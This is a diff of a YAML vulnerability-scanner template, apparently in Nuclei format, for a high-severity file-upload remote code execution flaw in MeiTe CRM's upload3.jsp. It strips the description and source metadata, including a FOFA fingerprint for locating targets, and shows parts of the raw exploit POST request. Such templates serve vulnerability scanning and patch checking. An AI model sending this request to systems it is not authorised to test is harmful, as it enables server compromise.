@@ -3,12 +3,8 @@ info:
   name: 美特CRM commonjspupload3.jsp 存在文件上传致RCE漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wzcrv1fu05magypb'
+  description: ''
   tags: rce,file-upload,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: wzcrv1fu05magypb
-    fofa: body="/common/scripts/basic.js"
 http:
 - raw:
   - 'POST /common/jsp/upload3.jsp?key=file&form=formdata&field=attach_name_1&filetitle=attach_title_1&folder=null&relativepath=null&%3E HTTP/1.1
@@ -82,7 +78,6 @@ http:
     null
 
     ------geckoformboundaryc4e5992e491182d9864532ef66356073--
-
 
 
     返回上传路径'
